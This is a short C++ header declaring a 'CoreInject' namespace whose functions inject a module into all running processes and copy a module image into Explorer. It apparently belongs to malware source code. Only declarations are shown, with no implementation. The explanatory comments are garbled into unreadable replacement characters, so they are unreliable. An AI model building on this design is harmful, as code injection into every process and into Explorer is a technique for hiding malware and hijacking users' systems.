/*
  �������� ���� � ��������.
*/
#pragma once

namespace CoreInject
{
  /*
    �������������.
  */
  void init(void);

  /*
    ���������������.
  */
  void uninit(void);

  /*
    �������������� ���� �� ��� �������� ������� ����� �������� �����.

    Return - true - ���� ��������� ������ ������ � ���� �������,
             false - ���� �� ������ ������� �� �����������.
  */
  bool _injectToAll(void);
	void* _copyModuleToExplorer(void *image);
};
